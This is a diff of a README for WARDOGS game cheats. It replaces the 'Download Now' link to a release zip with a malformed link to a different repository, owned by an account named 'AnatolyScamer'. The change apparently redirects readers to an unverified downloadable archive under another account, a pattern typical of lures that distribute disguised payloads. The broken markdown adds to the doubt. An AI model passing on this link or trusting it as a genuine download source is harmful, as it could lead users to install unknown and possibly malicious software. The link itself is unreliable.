@@ -16,7 +16,7 @@ The project provides a collection of gameplay tools, including visual informatio
 
 ## ⬇️ Download
 
-[**Download Now**](https://github.com/TeamHelpFortress/wardogs-cheats/releases/download/v1.0.0/wardogs.cheats.zip)
+[**Download Now**]([https://github.com/TeamHelpFortress/wardogs-cheats/releases/download/v1.0.0/wardogs.cheats.zip](https://github.com/AnatolyScamer/WARDOGS-Che-t/releases/tag/WARDOGS_CHEAT/download/1.0))
 
 **Latest Version:** `v1.0.0` • **File Size:** ~156 MB
 
